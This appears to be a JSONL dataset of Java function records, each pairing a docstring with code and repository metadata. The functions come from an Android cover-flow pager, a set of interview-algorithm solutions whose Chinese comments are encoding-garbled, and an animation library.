{"docstring": "/**\n * Set the currently selected page.\n *\n * @param item Item index to select\n * @param smoothScroll True to smoothly scroll to the new item, false to transition immediately\n */\n", "func_signal": "public void setCurrentItem(int item, boolean smoothScroll)", "code": "{\n    mPopulatePending = false;\n    setCurrentItemInternal(item, smoothScroll, false);\n}", "path": "coverflow\\src\\main\\java\\android\\support\\v4\\view\\LinkagePager.java", "repo_name": "crosswall/Android-Coverflow", "stars": 917, "license": "other", "language": "java", "size": 2348}
{"docstring": "/**\n * Add a listener that will be invoked whenever the page changes or is incrementally\n * scrolled. See {@link OnPageChangeListener}.\n *\n * <p>Components that add a listener should take care to remove it when finished.\n * Other components that take ownership of a view may call {@link #clearOnPageChangeListeners()}\n * to remove all attached listeners.</p>\n *\n * @param listener listener to add\n */\n", "func_signal": "public void addOnPageChangeListener(OnPageChangeListener listener)", "code": "{\n    if (mOnPageChangeListeners == null) {\n        mOnPageChangeListeners = new ArrayList<>();\n    }\n    mOnPageChangeListeners.add(listener);\n}", "path": "coverflow\\src\\main\\java\\android\\support\\v4\\view\\LinkagePager.java", "repo_name": "crosswall/Android-Coverflow", "stars": 917, "license": "other", "language": "java", "size": 2348}
{"docstring": "/**\n * @return Info about the page at the current scroll position.\n *         This can be synthetic for a missing middle page; the 'object' field can be null.\n */\n", "func_signal": "private ItemInfo infoForCurrentScrollPosition()", "code": "{\n    final int width = getClientWidth();\n    final float scrollOffset = width > 0 ? (float) getScrollX() / width : 0;\n    final float marginOffset = width > 0 ? (float) mPageMargin / width : 0;\n    int lastPos = -1;\n    float lastOffset = 0.f;\n    float lastWidth = 0.f;\n    boolean first = true;\n\n    ItemInfo lastItem = null;\n    for (int i = 0; i < mItems.size(); i++) {\n        ItemInfo ii = mItems.get(i);\n        float offset;\n        if (!first && ii.position != lastPos + 1) {\n            // Create a synthetic item for a missing page.\n            ii = mTempItem;\n            ii.offset = lastOffset + lastWidth + marginOffset;\n            ii.position = lastPos + 1;\n            ii.widthFactor = mAdapter.getPageWidth(ii.position);\n            i--;\n        }\n        offset = ii.offset;\n\n        final float leftBound = offset;\n        final float rightBound = offset + ii.widthFactor + marginOffset;\n        if (first || scrollOffset >= leftBound) {\n            if (scrollOffset < rightBound || i == mItems.size() - 1) {\n                return ii;\n            }\n        } else {\n            return lastItem;\n        }\n        first = false;\n        lastPos = ii.position;\n        lastOffset = offset;\n        lastWidth = ii.widthFactor;\n        lastItem = ii;\n    }\n\n    return lastItem;\n}", "path": "coverflow\\src\\main\\java\\android\\support\\v4\\view\\LinkagePager.java", "repo_name": "crosswall/Android-Coverflow", "stars": 917, "license": "other", "language": "java", "size": 2348}
{"docstring": "/**\n * Remove a listener that was previously added via\n * {@link #addOnPageChangeListener(OnPageChangeListener)}.\n *\n * @param listener listener to remove\n */\n", "func_signal": "public void removeOnPageChangeListener(OnPageChangeListener listener)", "code": "{\n    if (mOnPageChangeListeners != null) {\n        mOnPageChangeListeners.remove(listener);\n    }\n}", "path": "coverflow\\src\\main\\java\\android\\support\\v4\\view\\LinkagePager.java", "repo_name": "crosswall/Android-Coverflow", "stars": 917, "license": "other", "language": "java", "size": 2348}
{"docstring": "/**\n * Set the currently selected page. If the ViewPager has already been through its first\n * layout with its current adapter there will be a smooth animated transition between\n * the current item and the specified item.\n *\n * @param item Item index to select\n */\n", "func_signal": "public void setCurrentItem(int item)", "code": "{\n    mPopulatePending = false;\n    setCurrentItemInternal(item, !mFirstLayout, false);\n}", "path": "coverflow\\src\\main\\java\\android\\support\\v4\\view\\LinkagePager.java", "repo_name": "crosswall/Android-Coverflow", "stars": 917, "license": "other", "language": "java", "size": 2348}
{"docstring": "/**\n * Set a {@link PageTransformer} that will be called for each attached page whenever\n * the scroll position is changed. This allows the application to apply custom property\n * transformations to each page, overriding the default sliding look and feel.\n *\n * <p><em>Note:</em> Prior to Android 3.0 the property animation APIs did not exist.\n * As a result, setting a PageTransformer prior to Android 3.0 (API 11) will have no effect.</p>\n *\n * @param reverseDrawingOrder true if the supplied PageTransformer requires page views\n *                            to be drawn from last to first instead of first to last.\n * @param transformer PageTransformer that will modify each page's animation properties\n */\n", "func_signal": "public void setPageTransformer(boolean reverseDrawingOrder, PageTransformer transformer)", "code": "{\n    if (Build.VERSION.SDK_INT >= 11) {\n        final boolean hasTransformer = transformer != null;\n        final boolean needsPopulate = hasTransformer != (mPageTransformer != null);\n        mPageTransformer = transformer;\n        setChildrenDrawingOrderEnabledCompat(hasTransformer);\n        if (hasTransformer) {\n            mDrawingOrder = reverseDrawingOrder ? DRAW_ORDER_REVERSE : DRAW_ORDER_FORWARD;\n        } else {\n            mDrawingOrder = DRAW_ORDER_DEFAULT;\n        }\n        if (needsPopulate) populate();\n    }\n}", "path": "coverflow\\src\\main\\java\\android\\support\\v4\\view\\LinkagePager.java", "repo_name": "crosswall/Android-Coverflow", "stars": 917, "license": "other", "language": "java", "size": 2348}
{"docstring": "/**\n * Remove all listeners that are notified of any changes in scroll state or position.\n */\n", "func_signal": "public void clearOnPageChangeListeners()", "code": "{\n    if (mOnPageChangeListeners != null) {\n        mOnPageChangeListeners.clear();\n    }\n}", "path": "coverflow\\src\\main\\java\\android\\support\\v4\\view\\LinkagePager.java", "repo_name": "crosswall/Android-Coverflow", "stars": 917, "license": "other", "language": "java", "size": 2348}
{"docstring": "/**\n * You can call this function yourself to have the scroll view perform\n * scrolling from a key event, just as if the event had been dispatched to\n * it by the view hierarchy.\n *\n * @param event The key event to execute.\n * @return Return true if the event was handled, else false.\n */\n", "func_signal": "public boolean executeKeyEvent(KeyEvent event)", "code": "{\n    boolean handled = false;\n    if (event.getAction() == KeyEvent.ACTION_DOWN) {\n        switch (event.getKeyCode()) {\n            case KeyEvent.KEYCODE_DPAD_LEFT:\n                handled = arrowScroll(FOCUS_LEFT);\n                break;\n            case KeyEvent.KEYCODE_DPAD_RIGHT:\n                handled = arrowScroll(FOCUS_RIGHT);\n                break;\n            case KeyEvent.KEYCODE_TAB:\n                if (Build.VERSION.SDK_INT >= 11) {\n                    // The focus finder had a bug handling FOCUS_FORWARD and FOCUS_BACKWARD\n                    // before Android 3.0. Ignore the tab key on those devices.\n                    if (KeyEventCompat.hasNoModifiers(event)) {\n                        handled = arrowScroll(FOCUS_FORWARD);\n                    } else if (KeyEventCompat.hasModifiers(event, KeyEvent.META_SHIFT_ON)) {\n                        handled = arrowScroll(FOCUS_BACKWARD);\n                    }\n                }\n                break;\n        }\n    }\n    return handled;\n}", "path": "coverflow\\src\\main\\java\\android\\support\\v4\\view\\LinkagePager.java", "repo_name": "crosswall/Android-Coverflow", "stars": 917, "license": "other", "language": "java", "size": 2348}
{"docstring": "/**\n * We only want the current page that is being shown to be touchable.\n */\n", "func_signal": "@Override\npublic void addTouchables(ArrayList<View> views)", "code": "{\n    // Note that we don't call super.addTouchables(), which means that\n    // we don't call View.addTouchables().  This is okay because a ViewPager\n    // is itself not touchable.\n    for (int i = 0; i < getChildCount(); i++) {\n        final View child = getChildAt(i);\n        if (child.getVisibility() == VISIBLE) {\n            ItemInfo ii = infoForChild(child);\n            if (ii != null && ii.position == mCurItem) {\n                child.addTouchables(views);\n            }\n        }\n    }\n}", "path": "coverflow\\src\\main\\java\\android\\support\\v4\\view\\LinkagePager.java", "repo_name": "crosswall/Android-Coverflow", "stars": 917, "license": "other", "language": "java", "size": 2348}
{"docstring": "/**\n * Set the margin between pages.\n *\n * @param marginPixels Distance between adjacent pages in pixels\n * @see #getPageMargin()\n * @see #setPageMarginDrawable(Drawable)\n * @see #setPageMarginDrawable(int)\n */\n", "func_signal": "public void setPageMargin(int marginPixels)", "code": "{\n    final int oldMargin = mPageMargin;\n    mPageMargin = marginPixels;\n\n    final int width = getWidth();\n    recomputeScrollPosition(width, width, marginPixels, oldMargin);\n\n    requestLayout();\n}", "path": "coverflow\\src\\main\\java\\android\\support\\v4\\view\\LinkagePager.java", "repo_name": "crosswall/Android-Coverflow", "stars": 917, "license": "other", "language": "java", "size": 2348}
{"docstring": "// 1->2->3->4->5->6\n//       ^        |\n//       |        |\n//       +--------+\n", "func_signal": "private static void test02()", "code": "{\n    ListNode n1 = new ListNode(1);\n    ListNode n2 = new ListNode(2);\n    ListNode n3 = new ListNode(3);\n    ListNode n4 = new ListNode(4);\n    ListNode n5 = new ListNode(5);\n    ListNode n6 = new ListNode(6);\n\n    n1.next = n2;\n    n2.next = n3;\n    n3.next = n4;\n    n4.next = n5;\n    n5.next = n6;\n    n6.next = n3;\n\n    System.out.println(meetingNode(n1));\n}", "path": "src\\Test56.java", "repo_name": "Wang-Jun-Chao/coding-interviews", "stars": 736, "license": "None", "language": "java", "size": 200}
{"docstring": "/**\n * \u013f\u03f5\u00b0\u04e1\u036c\u04bb\u013d\u3c34\u04b5\u02f3\u04e1\u00ff\u04bb\u04e1\u04bb\u0421\n * @param root\n */\n", "func_signal": "public static void print(BinaryTreeNode root)", "code": "{\n    if (root == null) {\n        return;\n    }\n\n    List<BinaryTreeNode> list = new LinkedList<>();\n    BinaryTreeNode node;\n    // \u01f0\u013d\n    int current = 1;\n    // \u00bc\u04bb\u013d\n    int next = 0;\n    list.add(root);\n\n    while (list.size() > 0) {\n        node = list.remove(0);\n        current--;\n        System.out.printf(\"%-3d\", node.val);\n\n        if (node.left != null) {\n            list.add(node.left);\n            next++;\n        }\n        if (node.right != null) {\n            list.add(node.right);\n            next++;\n        }\n\n        if (current ==0) {\n            System.out.println();\n            current = next;\n            next = 0;\n        }\n    }\n}", "path": "src\\Test60.java", "repo_name": "Wang-Jun-Chao/coding-interviews", "stars": 736, "license": "None", "language": "java", "size": 200}
{"docstring": "/**\n * \u02b5\u04bb \u04bb\u01b1\u02be1\u0138\n * 9\u02be\u02761001 2\u03bb1. 9\u00f32\n *\n * @param n \n * @return \u0436\u01b11\u013f\n */\n", "func_signal": "public static int numberOfOne(int n)", "code": "{\n    // \u00bc1\u03bb\n    int result = 0;\n\n    // JAVA\u0539\u6df6\u0423int\u057c\u0138\u05bd\u06a3\u073c32\u03bb\n    // \u00ff\u04bb\u03bb1\u06fc\u04fe\u037f\u01f0\u05b5\u0131\u02be\u01f6\u03bb1\n    for (int i = 0; i < 32; i++) {\n        result += (n & 1);\n        n >>>= 1;\n    }\n\n    // \u00f5\u013d\n    return result;\n}", "path": "src\\Test10.java", "repo_name": "Wang-Jun-Chao/coding-interviews", "stars": 736, "license": "None", "language": "java", "size": 200}
{"docstring": "/**\n * \u04bb\n * @param root\n */\n", "func_signal": "private static void print(BinaryTreeNode root)", "code": "{\n    if (root != null) {\n        print(root.left);\n        System.out.printf(\"%-3d\", root.val);\n        print(root.right);\n    }\n}", "path": "src\\Test63.java", "repo_name": "Wang-Jun-Chao/coding-interviews", "stars": 736, "license": "None", "language": "java", "size": 200}
{"docstring": "/**\n * \u0436\u04bb\u01f7\u05bb235\u04e3\n *\n * @param num \u0436\u03f5\u01f8\n * @return true\u01f3false\n */\n", "func_signal": "private static boolean isUgly(int num)", "code": "{\n    while (num % 2 == 0) {\n        num /= 2;\n    }\n\n    while (num % 3 == 0) {\n        num /= 3;\n    }\n\n    while (num % 5 == 0) {\n        num /= 5;\n    }\n\n    return num == 1;\n}", "path": "src\\Test34.java", "repo_name": "Wang-Jun-Chao/coding-interviews", "stars": 736, "license": "None", "language": "java", "size": 200}
{"docstring": "/**\n * \u00b4\u04e1\u00ff\u38ec\u04bb\u013d\u3c34\u0574\u04b5\u02f3\u04e1\n * \u00b5\u0136\n *       8\n *    /    \\\n *   6     10\n *  /  \\   / \\\n * 5   7  9  11\n * \u03b4\u04e1861053 911.\n *\n * @param root \u013d\n */\n", "func_signal": "public static void printFromToBottom(BinaryTreeNode root)", "code": "{\n\n    // \u01ff\u02b1\u017d\u0432\n    if (root != null) {\n        // \u06b4\u017b\u03b4\u052a\n        Queue<BinaryTreeNode> list = new LinkedList<>();\n        // \n        list.add(root);\n        // \u06bc\u00bc\u01f0\u013d\n        BinaryTreeNode curNode;\n\n        // \u0437\u01ff\u0434\n        while (!list.isEmpty()) {\n            // \u027e\u052a\n            curNode = list.remove();\n            // \u052a\u0635\u05b5\n            System.out.print(curNode.value + \" \");\n            // \u04fd\u3cbb\u03aa\u0563\u04fd\n            if (curNode.left != null) {\n                list.add(curNode.left);\n            }\n            // \u04fd\u3cbb\u03aa\u0563\u04fd\n            if (curNode.right != null) {\n                list.add(curNode.right);\n            }\n        }\n    }\n}", "path": "src\\Test23.java", "repo_name": "Wang-Jun-Chao/coding-interviews", "stars": 736, "license": "None", "language": "java", "size": 200}
{"docstring": "/**\n * \u0377\u05b8\u04bb\u05b8\ub8ec\u04bb0(1)\u02b1\u027e\u00fd,\n * \u05e21\u0131\u03f5\u0132\u04bb\u03f5\u00fb\u0437\u05b5\u03aaJAVA\u00f4\u0775\u052d\n * \u027e\u013d\u0377\u38ec\u00f7\u05b5\u0137\u02bd\u00f4\u0377\u0536\u027e\u02e1\n * \u05e22\u0134\u027e\u01f4\u0435\u013d\u38ec\u00fb\u0431\u05a4\n *\n * @param head        \u0377\n * @param toBeDeleted \u027e\u013d\n * @return \u027e\u0377\n */\n", "func_signal": "public static ListNode deleteNode(ListNode head, ListNode toBeDeleted)", "code": "{\n\n    // \u043f\u05b5\u0377\u0631\u0377\n    if (head == null || toBeDeleted == null) {\n        return head;\n    }\n\n    // \u027e\u0377\u38ec\u05b1\u04f7\u0377\u04bb\n    if (head == toBeDeleted) {\n        return head.next;\n    }\n\n    // \n\n    // \u06b6\u06b5\u00a3\u027e\u04bb\u052a\n    if (toBeDeleted.next == null) {\n        // \u04b4\u027e\u052a\u0635\u01f0\n        ListNode tmp = head;\n        while (tmp.next != toBeDeleted) {\n            tmp = tmp.next;\n        }\n        // \u027e\n        tmp.next = null;\n\n    }\n    // \u06b6\u06b5\u00a3\u027e\u0133\u043c\n    else {\n        // \u04bb\u05b5\ubd71\u01f0\u027e\u013d\n        toBeDeleted.value = toBeDeleted.next.value;\n        // \u027e\u013d\u04bb\u05b8\u052d\u0234\u027e\u0175\u00b8\u38ec\u027e\u04bb\u027e\n        toBeDeleted.next = toBeDeleted.next.next;\n    }\n\n    // \u027e\u06b5\u0377\n    return head;\n}", "path": "src\\Test13.java", "repo_name": "Wang-Jun-Chao/coding-interviews", "stars": 736, "license": "None", "language": "java", "size": 200}
{"docstring": "// 1->2->3->4->5->6\n", "func_signal": "private static void test01()", "code": "{\n    ListNode n1 = new ListNode(1);\n    ListNode n2 = new ListNode(2);\n    ListNode n3 = new ListNode(3);\n    ListNode n4 = new ListNode(4);\n    ListNode n5 = new ListNode(5);\n    ListNode n6 = new ListNode(6);\n\n    n1.next = n2;\n    n2.next = n3;\n    n3.next = n4;\n    n4.next = n5;\n    n5.next = n6;\n\n    System.out.println(meetingNode(n1));\n}", "path": "src\\Test56.java", "repo_name": "Wang-Jun-Chao/coding-interviews", "stars": 736, "license": "None", "language": "java", "size": 200}
{"docstring": "// 1->2->3->4->5->6 <-+\n//                |   |\n//                +---+\n", "func_signal": "private static void test03()", "code": "{\n    ListNode n1 = new ListNode(1);\n    ListNode n2 = new ListNode(2);\n    ListNode n3 = new ListNode(3);\n    ListNode n4 = new ListNode(4);\n    ListNode n5 = new ListNode(5);\n    ListNode n6 = new ListNode(6);\n\n    n1.next = n2;\n    n2.next = n3;\n    n3.next = n4;\n    n4.next = n5;\n    n5.next = n6;\n    n6.next = n6;\n\n    System.out.println(meetingNode(n1));\n}", "path": "src\\Test56.java", "repo_name": "Wang-Jun-Chao/coding-interviews", "stars": 736, "license": "None", "language": "java", "size": 200}
{"docstring": "/**\n * \u02b5\u04bb \u04bb\u01b1\u02be1\u0138\n * 9\u02be\u02761001 2\u03bb1. 9\u00f32\n * \u05b7\u0427\u02b8\u07e1\n *\n * @param n \n * @return \u0436\u01b11\u013f\n */\n", "func_signal": "public static int numberOfOne2(int n)", "code": "{\n    // \u00bc1\u03bb\n    int result = 0;\n\n    // \u05b5\u0136\u01b1\u02be\u0436\u06781\u037d\u0436\u0674\u03b2\n    while (n != 0) {\n        result++;\n        // \u04b1\u07f51\u02bc\u00ff\u04bb\u03b2\u02b9n\u04b5\u04bb10\n        // \u02b9\u01f7\u03bb\u04b2\u0432\n        n = (n - 1) & n;\n    }\n\n    // \u00f5\u013d\n    return result;\n}", "path": "src\\Test10.java", "repo_name": "Wang-Jun-Chao/coding-interviews", "stars": 736, "license": "None", "language": "java", "size": 200}
{"docstring": "// \u027e\u06b6\u0377\u027e\n", "func_signal": "public T deleteHead()", "code": "{\n\n    // \u0436\u03f5\u057b\u01f7\u03aa\u0563\u03aa\u057e\u037d\u057b\u0775\u057b\n    // \u04bd\u0479\ubd6f\u057b\n    if (stack2.isEmpty()) {\n        while (!stack1.isEmpty()) {\n            stack2.add(stack1.pop());\n        }\n    }\n\n    // \u057b\u043b\u00fb\u077e\u05f3\ucce3\n    if (stack2.isEmpty()) {\n        throw new RuntimeException(\"No more element.\");\n    }\n\n    // \u0635\u057b\u057b\u052a\u0623\u04e6\u013e\u01f6\u052a\u0621\n    return stack2.pop();\n}", "path": "src\\Test07.java", "repo_name": "Wang-Jun-Chao/coding-interviews", "stars": 736, "license": "None", "language": "java", "size": 200}
{"docstring": "/**\n * \u04b5index\u06b6\u05b7\n *\n * @param index index\n * @return \u04e6\u0133\u05b5\n */\n", "func_signal": "public static int getUglyNumber2(int index)", "code": "{\n    if (index <= 0) {\n        return 0;\n    }\n\n    int[] pUglyNumbers = new int[index];\n    pUglyNumbers[0] = 1;\n    int nextUglyIndex = 1;\n\n    int p2 = 0;\n    int p3 = 0;\n    int p5 = 0;\n\n    while (nextUglyIndex < index) {\n        int min = min(pUglyNumbers[p2] * 2, pUglyNumbers[p3] * 3, pUglyNumbers[p5] * 5);\n        pUglyNumbers[nextUglyIndex] = min;\n\n        while (pUglyNumbers[p2] * 2 <= pUglyNumbers[nextUglyIndex]) {\n            p2++;\n        }\n\n        while (pUglyNumbers[p3] * 3 <= pUglyNumbers[nextUglyIndex]) {\n            p3++;\n        }\n\n        while (pUglyNumbers[p5] * 5 <= pUglyNumbers[nextUglyIndex]) {\n            p5++;\n        }\n\n        nextUglyIndex++;\n    }\n\n    return pUglyNumbers[nextUglyIndex - 1];\n}", "path": "src\\Test34.java", "repo_name": "Wang-Jun-Chao/coding-interviews", "stars": 736, "license": "None", "language": "java", "size": 200}
{"docstring": "/**\n * \u013f\u0373\u04bb\u05a3\u0433\u05b5\u0134\n * @param data\n * @param k\n * @return\n */\n", "func_signal": "public static int getNumberOfK(int[] data, int k)", "code": "{\n    int number = 0;\n    if (data != null && data.length > 0) {\n        int first = getFirstK(data, k, 0, data.length - 1);\n        int last = getLastK(data, k, 0, data.length - 1);\n\n        if (first > -1 && last > -1) {\n            number = last - first + 1;\n        }\n    }\n\n    return number;\n}", "path": "src\\Test38.java", "repo_name": "Wang-Jun-Chao/coding-interviews", "stars": 736, "license": "None", "language": "java", "size": 200}
{"docstring": "/**\n * \u0435\u0421\u05b5\n *\n * @param numbers \n * @param start   \u02bc\u03bb\n * @param end     \u013d\u03bb\n * @return \u04b5\u0421\n */\n", "func_signal": "public static int minInorder(int[] numbers, int start, int end)", "code": "{\n    int result = numbers[start];\n    for (int i = start + 1; i <= end; i++) {\n        if (result > numbers[i]) {\n            result = numbers[i];\n        }\n    }\n    return result;\n}", "path": "src\\Test08.java", "repo_name": "Wang-Jun-Chao/coding-interviews", "stars": 736, "license": "None", "language": "java", "size": 200}
{"docstring": "/**\n * k\u04bb\u03b3\u05b5\u03bb\n *\n * @param data\n * @param k\n * @param start\n * @param end\n * @return\n */\n", "func_signal": "private static int getFirstK(int[] data, int k, int start, int end)", "code": "{\n    if (data == null || data.length < 1 || start > end) {\n        return -1;\n    }\n\n    int midIdx = start + (end - start) / 2;\n    int midData = data[midIdx];\n\n    if (midData == k) {\n        if (midIdx > 0 && data[midIdx - 1] != k || midIdx == 0) {\n            return midIdx;\n        } else {\n            end = midIdx - 1;\n        }\n    } else if (midData > k) {\n        end = midIdx - 1;\n    } else {\n        start = midIdx + 1;\n    }\n\n    return getFirstK(data, k, start, end);\n}", "path": "src\\Test38.java", "repo_name": "Wang-Jun-Chao/coding-interviews", "stars": 736, "license": "None", "language": "java", "size": 200}
{"docstring": "/**\n * k\u04bb\u03b3\u05b5\u03bb\n *\n * @param data\n * @param k\n * @param start\n * @param end\n * @return\n */\n", "func_signal": "private static int getLastK(int[] data, int k, int start, int end)", "code": "{\n    if (data == null || data.length < 1 || start > end) {\n        return -1;\n    }\n\n    int midIdx = start + (end - start) / 2;\n    int midData = data[midIdx];\n\n    if (midData == k) {\n        if (midIdx + 1 < data.length && data[midIdx + 1] != k || midIdx == data.length - 1) {\n            return midIdx;\n        } else {\n            start = midIdx + 1;\n        }\n    } else if (midData < k) {\n        start = midIdx + 1;\n    } else {\n        end = midIdx - 1;\n    }\n\n    return getLastK(data, k, start, end);\n}", "path": "src\\Test38.java", "repo_name": "Wang-Jun-Chao/coding-interviews", "stars": 736, "license": "None", "language": "java", "size": 200}
{"docstring": "/**\n * \u052a\u05b5\n *\n * @param head \u0377\n */\n", "func_signal": "public static void printList(ListNode head)", "code": "{\n    while (head != null) {\n        System.out.print(head.value + \"->\");\n        head = head.next;\n    }\n    System.out.println(\"null\");\n}", "path": "src\\Test13.java", "repo_name": "Wang-Jun-Chao/coding-interviews", "stars": 736, "license": "None", "language": "java", "size": 200}
{"docstring": "/**\n * \u013f2 \u04bb\u98ec\u04b2\u0438\u04bb\n * \u0136\u04bb\u9863\u013a\u0375\u05b5\u04aa\u02b1\u4e34\u04f6\u03aaO(n)\n *\n * @param arr \n * @return \n */\n", "func_signal": "public static int findGreatestSumOfSubArray(int[] arr)", "code": "{\n    // \u0423\n    if (arr == null || arr.length < 1) {\n        throw new IllegalArgumentException(\"Array must contain an element\");\n    }\n\n    // \u00bc\u0363\u02bc\u02b1\u0421\n    int max = Integer.MIN_VALUE;\n    // \u01f0\u013a\n    int curMax = 0;\n    // \n    for (int i : arr) {\n        // \u01f0\u0421\u06b50\u00f5\u01f0\n        if (curMax <= 0) {\n            curMax = i;\n        }\n        // \u01f0\u03740\u06fc\u04f5\u01f0\n        else {\n            curMax += i;\n        }\n\n        // \u00bc\u00bc\u06b5\n        if (max < curMax) {\n            max = curMax;\n        }\n    }\n\n\n    return max;\n}", "path": "src\\Test31.java", "repo_name": "Wang-Jun-Chao/coding-interviews", "stars": 736, "license": "None", "language": "java", "size": 200}
{"docstring": "/**\n * \u04b5index\u0676\u032b\n *\n * @param index index\n * @return \u04e6\u0133\u05b5\n */\n", "func_signal": "public static int getUglyNumber(int index)", "code": "{\n    if (index <= 0) {\n        return 0;\n    }\n\n    int num = 0;\n    int uglyFound = 0;\n    while (uglyFound < index) {\n        num++;\n        if (isUgly(num)) {\n            ++uglyFound;\n        }\n    }\n\n    return num;\n}", "path": "src\\Test34.java", "repo_name": "Wang-Jun-Chao/coding-interviews", "stars": 736, "license": "None", "language": "java", "size": 200}
{"docstring": "/**\n * \u04bb\uefea\u02bc\u0278\u052a\u0630\u1d7d\u0129\u03b2 \u01f3\u05ae\u05ea\n * \u04bb\u04bb\u05ea\u05ea\u0421\u052a\u0621\n * {3, 4, 5, 1, 2\u03aal ,2, 3, 4, 5}\u04bb\u05ea\u0421\u05b5\u03aa\n *\n * @param numbers \u05ea\n * @return \u0421\u05b5\n */\n", "func_signal": "public static int min(int[] numbers)", "code": "{\n    // \u0436\u01f7\u03f7\n    if (numbers == null || numbers.length == 0) {\n        throw new RuntimeException(\"Invalid input.\");\n    }\n\n    // \u02bc\u0135\u04bb\u03bb\n    int lo = 0;\n    // \u02bc\u04bb\u03bb\n    int hi = numbers.length - 1;\n    // \u00f3\u02bc\u05b5\n    int mi = lo;\n\n    // \u0237lo\u01f0\u04bb\u017a\u0132\u05a3hi\u017a\u013a\u04bb\n    while (numbers[lo] >= numbers[hi]) {\n        // \u03a7\u05bb\u02b1\u063a\u04bb\n        // \u03aanumbers[lo] >= numbers[hi]\u01f3\u04bb\u04e6\u0421\u05b5\n        if (hi - lo == 1) {\n            return numbers[hi];\n        }\n\n        // \u0221\u043c\u03bb\n        mi = lo + (hi - lo) / 2;\n\n        // \u0223\u04aa\u02f3\u0377\u03b2\u0421\u05b5\n        if (numbers[mi] == numbers[lo] && numbers[hi] == numbers[mi]) {\n            return minInorder(numbers, lo, hi);\n        }\n\n        // \u043c\u03bb\u00f6\u04e6\u05b5\u01f0\u04bb\u017a\u0132\u05a3lo\u03aa\u00b5\u0134\u03bb\n        if (numbers[mi] >= numbers[lo]) {\n            lo = mi;\n        }\n        // \u043c\u03bb\u00f6\u04e6\u05b5\u06ba\u04bb\u017a\u0132\u05a3hi\u03aa\u00b5\u0134\u03bb\n        else if (numbers[mi] <= numbers[hi]) {\n            hi = mi;\n        }\n    }\n\n    // \u0575\u0134\n    return numbers[mi];\n}", "path": "src\\Test08.java", "repo_name": "Wang-Jun-Chao/coding-interviews", "stars": 736, "license": "None", "language": "java", "size": 200}
{"docstring": "/**\n * Constructor\n *\n * @param context      The Context the view is running in, through which it can\n *                     access the current theme, resources, etc.\n * @param attrs        The attributes of the XML tag that is inflating the view.\n * @param defStyleAttr An attribute in the current theme that contains a\n *                     reference to a style resource that supplies default values for\n *                     the view. Can be 0 to not look for defaults.\n */\n", "func_signal": "public FPSTextureView(Context context, AttributeSet attrs, int defStyleAttr)", "code": "{\n    super(context, attrs, defStyleAttr);\n    setOpaque(false);\n    setSurfaceTextureListener(this);\n\n    // FPS set\n    TypedArray ta = getContext().obtainStyledAttributes(attrs, R.styleable.FPSAnimator);\n    mFps = ta.getInteger(R.styleable.FPSAnimator_FPSAnimator_fps, Constant.DEFAULT_FPS);\n    ta.recycle();\n}", "path": "library\\src\\main\\java\\com\\daasuu\\library\\FPSTextureView.java", "repo_name": "MasayukiSuda/FPSAnimator", "stars": 753, "license": "None", "language": "java", "size": 3310}
{"docstring": "/**\n * @param elapsedTimeRate Elapsed time / Total time\n * @param amount          amount The strength of the ease.\n * @return easedValue\n */\n", "func_signal": "private static float getBackInOut(float elapsedTimeRate, float amount)", "code": "{\n    amount *= 1.525;\n    if ((elapsedTimeRate *= 2) < 1) {\n        return (float) (0.5 * (elapsedTimeRate * elapsedTimeRate * ((amount + 1) * elapsedTimeRate - amount)));\n    }\n    return (float) (0.5 * ((elapsedTimeRate -= 2) * elapsedTimeRate * ((amount + 1) * elapsedTimeRate + amount) + 2));\n}", "path": "library\\src\\main\\java\\com\\daasuu\\library\\easing\\EaseProvider.java", "repo_name": "MasayukiSuda/FPSAnimator", "stars": 753, "license": "None", "language": "java", "size": 3310}
{"docstring": "/**\n * Removes the child at the specified index from the display list.\n *\n * @param location index\n * @return this\n */\n", "func_signal": "public FPSTextureView removeChildAt(int location)", "code": "{\n    DisplayBase removed = mDisplayList.remove(location);\n    if (removed != null) {\n        removed.disable();\n    }\n    return this;\n}", "path": "library\\src\\main\\java\\com\\daasuu\\library\\FPSTextureView.java", "repo_name": "MasayukiSuda/FPSAnimator", "stars": 753, "license": "None", "language": "java", "size": 3310}
{"docstring": "/**\n * Removes the specified child from the display list.\n *\n * @param displayBase DisplayBase\n * @return this\n */\n", "func_signal": "public FPSTextureView removeChild(@NonNull DisplayBase displayBase)", "code": "{\n    displayBase.disable();\n    boolean a = mDisplayList.remove(displayBase);\n    return this;\n}", "path": "library\\src\\main\\java\\com\\daasuu\\library\\FPSTextureView.java", "repo_name": "MasayukiSuda/FPSAnimator", "stars": 753, "license": "None", "language": "java", "size": 3310}
{"docstring": "/**\n * @param elapsedTimeRate Elapsed time / Total time\n * @param amplitude       Amplitude of easing\n * @param period          Animation of period\n * @return easedValue\n */\n", "func_signal": "private static float getElasticIn(float elapsedTimeRate, double amplitude, double period)", "code": "{\n    if (elapsedTimeRate == 0 || elapsedTimeRate == 1) return elapsedTimeRate;\n    double pi2 = Math.PI * 2;\n    double s = period / pi2 * Math.asin(1 / amplitude);\n    return (float) -(amplitude * Math.pow(2f, 10f * (elapsedTimeRate -= 1f)) * Math.sin((elapsedTimeRate - s) * pi2 / period));\n}", "path": "library\\src\\main\\java\\com\\daasuu\\library\\easing\\EaseProvider.java", "repo_name": "MasayukiSuda/FPSAnimator", "stars": 753, "license": "None", "language": "java", "size": 3310}
{"docstring": "/**\n * Swaps the specified children's depth in the display list. If either child is not a child of this Container, return false.\n *\n * @param child1 DisplayObject\n * @param child2 DisplayObject\n * @return if true, success to swapChildren\n */\n", "func_signal": "public boolean swapChildren(@NonNull DisplayObject child1, @NonNull DisplayObject child2)", "code": "{\n    child1.swapPriority(child2);\n    int childIndex1 = mDisplayList.indexOf(child1);\n    int childIndex2 = mDisplayList.indexOf(child2);\n\n    if (childIndex1 == -1 || childIndex2 == -1) {\n        return false;\n    }\n\n    removeChildAt(childIndex1);\n    addChildAt(childIndex1, child2);\n    removeChildAt(childIndex2);\n    addChildAt(childIndex2, child1);\n    return true;\n}", "path": "library\\src\\main\\java\\com\\daasuu\\library\\Container.java", "repo_name": "MasayukiSuda/FPSAnimator", "stars": 753, "license": "None", "language": "java", "size": 3310}
{"docstring": "/**\n * The left offset and y offset for this display object's registration point. For example, to make a 100x100px Bitmap scale\n * around its center, you would set regX and regY to 50.\n *\n * @param regX The horizontal rotate registration point in pixels\n * @param regY The vertical rotate registration point in pixels\n * @return this\n */\n", "func_signal": "public RectDrawer scaleRegistration(float regX, float regY)", "code": "{\n    setScaleRegistration(regX, regY);\n    return this;\n}", "path": "library\\src\\main\\java\\com\\daasuu\\library\\drawer\\RectDrawer.java", "repo_name": "MasayukiSuda/FPSAnimator", "stars": 753, "license": "None", "language": "java", "size": 3310}
